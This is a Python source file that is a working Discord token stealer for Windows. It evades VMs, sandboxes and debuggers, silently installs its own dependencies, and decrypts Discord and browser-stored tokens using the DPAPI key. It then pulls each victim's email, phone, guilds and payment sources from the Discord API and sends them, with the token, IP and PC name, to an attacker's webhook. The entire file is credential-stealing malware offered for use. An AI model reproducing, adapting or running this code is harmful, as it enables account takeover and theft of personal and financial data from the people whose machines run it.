import os
if os.name != "nt":
    exit()
import subprocess
import sys
import json
import urllib.request
import urllib.parse
import re
import base64
import datetime
import ctypes
import ctypes.wintypes
import winreg
import psutil
import time
import random

def install_import(modules):
    for module, pip_name in modules:
        try:
            __import__(module)
        except ImportError:
            subprocess.check_call([sys.executable, "-m", "pip", "install", pip_name], 
                                  stdout=subprocess.DEVNULL, 
                                  stderr=subprocess.DEVNULL)
            os.execl(sys.executable, sys.executable, *sys.argv)

install_import([("win32crypt", "pypiwin32"), ("Crypto.Cipher", "pycryptodome")])
import win32crypt
from Crypto.Cipher import AES

LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")

WEBHOOK_URL = "webhook here"

WEBHOOK_NAME = "Gon the God"
WEBHOOK_AVATAR = "https://i.pinimg.com/736x/6a/24/88/6a24881ff591c4fa252fee732ad6eb00.jpg"
EMBED_COLOR = 3092790
FOOTER_TEXT = "github.com/00ie"
FOOTER_ICON = ""

PATHS = {
    'Discord': ROAMING + '\\discord',
    'Discord Canary': ROAMING + '\\discordcanary',
    'Discord PTB': ROAMING + '\\discordptb',
    'Chrome': LOCAL + "\\Google\\Chrome\\User Data",
    'Brave': LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data',
    'Edge': LOCAL + '\\Microsoft\\Edge\\User Data',
    'Opera': LOCAL + '\\Opera Software\\Opera Stable',
    'Opera GX': LOCAL + '\\Opera Software\\Opera GX Stable',
    'Vivaldi': LOCAL + '\\Vivaldi\\User Data',
    'Yandex': LOCAL + '\\Yandex\\YandexBrowser\\User Data'
}

class SecurityCheck:
    
    @staticmethod
    def check_vm():
        vm_indicators = [
            "vboxservice.exe", "vboxtray.exe", 
            "vmtoolsd.exe", "vmwareuser.exe", 
            "vmwaretray.exe", "xenservice.exe",
            "qemu-ga.exe", "prl_cc.exe", "prl_tools.exe"
        ]
        
        try:
            result = subprocess.run(
                ['tasklist', '/FO', 'CSV'], 
                capture_output=True, 
                text=True,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            
            output_lower = result.stdout.lower()
            for proc in vm_indicators:
                if proc.lower() in output_lower:
                    return True
            
            vm_registry_keys = [
                r"HARDWARE\ACPI\DSDT\VBOX__",
                r"HARDWARE\ACPI\FADT\VBOX__",
                r"SYSTEM\CurrentControlSet\Enum\PCI\VEN_80EE&DEV_BEEF",
                r"SYSTEM\CurrentControlSet\Enum\PCI\VEN_15AD&DEV_0405",
            ]
            
            for key_path in vm_registry_keys:
                try:
                    winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path)
                    return True
                except:
                    continue
                    
        except:
            pass
        return False
    
    @staticmethod
    def check_sandbox():
        try:
            uptime = psutil.boot_time()
            current_time = time.time()
            if (current_time - uptime) < 300:
                return True
            
            import shutil
            total, used, free = shutil.disk_usage("C:\\")
            if total < 85 * 1024**3:
                return True
            
            ram = psutil.virtual_memory().total / 1024**3
            if ram < 2:
                return True
            
            cpu_count = psutil.cpu_count()
            if cpu_count < 2:
                return True
                
        except:
            pass
        return False
    
    @staticmethod
    def check_antivirus():
        av_processes = [
            "avastui.exe", "avgui.exe", "avguard.exe", 
            "bdagent.exe", "mbam.exe", "mbamtray.exe",
            "msmpeng.exe", "msseces.exe", "nortonsecurity.exe",
            "spideragent.exe", "uiWinMgr.exe", "vsserv.exe",
            "cfp.exe", "cmdagent.exe", "ekrn.exe",
            "fshoster32.exe", "mcshield.exe", "mpcmdrun.exe",
            "msascui.exe", "NortonSecurity.exe", "SavService.exe"
        ]
        
        try:
            result = subprocess.run(
                ['tasklist', '/FO', 'CSV'], 
                capture_output=True, 
                text=True,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            
            output_lower = result.stdout.lower()
            for proc in av_processes:
                if proc.lower() in output_lower:
                    return True
        except:
            pass
        return False
    
    @staticmethod
    def check_debuggers():
        debugger_processes = [
            "ollydbg.exe", "x64dbg.exe", "idaq.exe", "idaq64.exe",
            "windbg.exe", "dnspy.exe", "devenv.exe", "procmon.exe",
            "procmon64.exe", "wireshark.exe", "fiddler.exe", 
            "charles.exe", "httpdebugger.exe", "httpanalyzer.exe",
            "resourcehacker.exe", "peid.exe", "lordpe.exe",
            "immunitydebugger.exe", "hxd.exe", "cheatengine.exe",
            "processhacker.exe", "processhacker2.exe", "processexplorer.exe"
        ]
        
        try:
            result = subprocess.run(
                ['tasklist', '/FO', 'CSV'], 
                capture_output=True, 
                text=True,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            
            output_lower = result.stdout.lower()
            for proc in debugger_processes:
                if proc.lower() in output_lower:
                    return True
        except:
            pass
        return False
    
    @staticmethod
    def check_task_manager():
        task_manager_names = ["taskmgr.exe", "processexplorer.exe"]
        
        try:
            result = subprocess.run(
                ['tasklist', '/FO', 'CSV'], 
                capture_output=True, 
                text=True,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            
            output_lower = result.stdout.lower()
            for proc in task_manager_names:
                if proc.lower() in output_lower:
                    return True
        except:
            pass
        return False
    
    @staticmethod
    def is_safe_environment():
        checks = [
            SecurityCheck.check_vm(),
            SecurityCheck.check_sandbox(),
            SecurityCheck.check_debuggers(),
            SecurityCheck.check_task_manager()
        ]
        
        if sum(checks) >= 2:
            return False
        
        if SecurityCheck.check_antivirus():
            pass
            
        return True

def getheaders(token=None):
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    }
    if token:
        headers["Authorization"] = token
    return headers

def gettokens(path):
    tokens = []
    leveldb_path = os.path.join(path, "Local Storage", "leveldb")
    if not os.path.isdir(leveldb_path):
        return tokens
    for file in os.listdir(leveldb_path):
        if not file.endswith((".ldb", ".log")):
            continue
        try:
            filepath = os.path.join(leveldb_path, file)
            with open(filepath, "r", errors="ignore") as f:
                content = f.read()
                matches = re.findall(r"dQw4w9WgXcQ:[^\"]+", content)
                tokens.extend(matches)
        except:
            continue
    return tokens

def getkey(path):
    try:
        local_state_path = os.path.join(path, "Local State")
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        return local_state["os_crypt"]["encrypted_key"]
    except:
        return None

def decrypt_token(raw_token, key):
    try:
        encrypted = base64.b64decode(raw_token.split("dQw4w9WgXcQ:")[1])
        cipher = AES.new(key, AES.MODE_GCM, encrypted[3:15])
        return cipher.decrypt(encrypted[15:])[:-16].decode()
    except:
        return None

def api_request(url, token=None):
    try:
        req = urllib.request.Request(url, headers=getheaders(token))
        with urllib.request.urlopen(req, timeout=10) as r:
            return json.loads(r.read().decode())
    except:
        return None

def get_user_data(token):
    return api_request("https://discord.com/api/v10/users/@me", token)

def get_guilds_data(token):
    params = urllib.parse.urlencode({"with_counts": True})
    result = api_request(f"https://discord.com/api/v10/users/@me/guilds?{params}", token)
    return result if result else []

def get_billing_data(token):
    result = api_request("https://discord.com/api/v10/users/@me/billing/subscriptions", token)
    return result if result else []

def get_payment_data(token):
    result = api_request("https://discord.com/api/v10/users/@me/billing/payment-sources", token)
    return result if result else []

def get_ip():
    try:
        with urllib.request.urlopen("https://api.ipify.org?format=json", timeout=5) as r:
            return json.loads(r.read().decode()).get("ip", "Unknown")
    except:
        return "Unknown"

def send_webhook(embed):
    try:
        payload = {
            "username": WEBHOOK_NAME,
            "avatar_url": WEBHOOK_AVATAR,
            "embeds": [embed]
        }
        data = json.dumps(payload).encode()
        req = urllib.request.Request(
            WEBHOOK_URL,
            data=data,
            headers=getheaders(),
            method="POST"
        )
        with urllib.request.urlopen(req, timeout=15):
            return True
    except:
        return False

def build_embed(user, token, platform, ip):
    guilds = get_guilds_data(token)
    billing = get_billing_data(token)
    payment = get_payment_data(token)
    
    admin_guilds = []
    for g in guilds:
        try:
            if int(g.get("permissions", 0)) & (8 | 32):
                admin_guilds.append(g.get("name", "Unknown"))
        except:
            continue
    
    has_nitro = bool(billing)
    pay_amount = len(payment)
    valid_pay = sum(1 for p in payment if not p.get("invalid", True))
    
    description = f"```yaml\n"
    description += f"User ID: {user.get('id', 'N/A')}\n"
    description += f"Email: {user.get('email', 'N/A')}\n"
    description += f"Phone: {user.get('phone', 'N/A')}\n"
    description += f"Guilds: {len(guilds)}\n"
    description += f"Admin perms: {', '.join(admin_guilds[:3]) if admin_guilds else 'No admin guilds'}\n```\n"
    
    description += f"```yaml\n"
    description += f"MFA Enabled: {user.get('mfa_enabled', False)}\n"
    description += f"Verified: {user.get('verified', False)}\n"
    description += f"Locale: {user.get('locale', 'N/A')}\n```\n"
    
    description += f"```yaml\n"
    description += f"IP: {ip}\n"
    description += f"Username: {os.getenv('USERNAME', 'N/A')}\n"
    description += f"PC Name: {os.getenv('COMPUTERNAME', 'N/A')}\n"
    description += f"Token Location: {platform}\n```\n"
    
    if has_nitro:
        description += f"```yaml\nNitro: Yes\n```\n"
    
    if pay_amount > 0:
        description += f"```yaml\nPayment Methods: {pay_amount}\n"
        description += f"Valid Methods: {valid_pay}\n```\n"
    
    description += f"```yaml\nToken:\n{token}\n```"
    
    embed_data = {
        "title": f"**User data: {user.get('username', 'Unknown')}**",
        "description": description,
        "color": EMBED_COLOR,
        "footer": {"text": FOOTER_TEXT},
        "thumbnail": {"url": f"https://cdn.discordapp.com/avatars/{user.get('id', '')}/{user.get('avatar', '')}.png"} if user.get('avatar') else {}
    }
    
    if FOOTER_ICON:
        embed_data["footer"]["icon_url"] = FOOTER_ICON
    
    return embed_data

def main():
    if not SecurityCheck.is_safe_environment():
        return
    
    checked_tokens = set()
    ip_address = get_ip()
    
    for platform_name, base_path in PATHS.items():
        if not os.path.isdir(base_path):
            continue
        
        if any(x in platform_name.lower() for x in ["chrome", "brave", "edge", "opera", "vivaldi", "yandex"]):
            profiles = []
            for item in os.listdir(base_path):
                item_path = os.path.join(base_path, item)
                if os.path.isdir(item_path) and (item == "Default" or item.startswith("Profile")):
                    profiles.append(item_path)
            
            if not profiles:
                continue
            
            for profile_path in profiles:
                process_profile(profile_path, platform_name, checked_tokens, ip_address)
        else:
            process_profile(base_path, platform_name, checked_tokens, ip_address)

def process_profile(profile_path, platform_name, checked_tokens, ip_address):
    encrypted_key = getkey(profile_path)
    if not encrypted_key:
        return
    
    try:
        key_bytes = base64.b64decode(encrypted_key)[5:]
        key = win32crypt.CryptUnprotectData(key_bytes, None, None, None, 0)[1]
    except:
        return
    
    raw_tokens = gettokens(profile_path)
    if not raw_tokens:
        return
    
    for raw_token in raw_tokens:
        token = decrypt_token(raw_token, key)
        if not token or token in checked_tokens:
            continue
        
        checked_tokens.add(token)
        user = get_user_data(token)
        if not user:
            continue
        
        embed = build_embed(user, token, platform_name, ip_address)
        send_webhook(embed)

if __name__ == "__main__":
    time.sleep(random.randint(1, 5))
    main()